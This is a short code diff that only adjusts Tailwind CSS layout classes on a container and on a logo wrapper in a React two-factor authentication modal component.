@@ -204,7 +204,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
             onClose={handleClose}
             isClosable={false}
         >
-            <div className="h-full flex flex-col flex-start w-full items-center justify-between flex-1">
+            <div className="flex min-h-full w-full min-w-0 flex-col gap-6 pb-1">
                 <div className='w-full'>
                     <div className='flex w-full items-center text-[#9a979e] gap-[6px] text-[14px] mb-[7px]'>
                         <span>{fullName}</span>
@@ -259,7 +259,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                     </div>
                 </div>
 
-                <div className='w-[60px] mt-[20px] mx-auto pt-8'>
+                <div className='mx-auto h-[60px] w-[60px] shrink-0'>
                     <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
                 </div>
             </div>
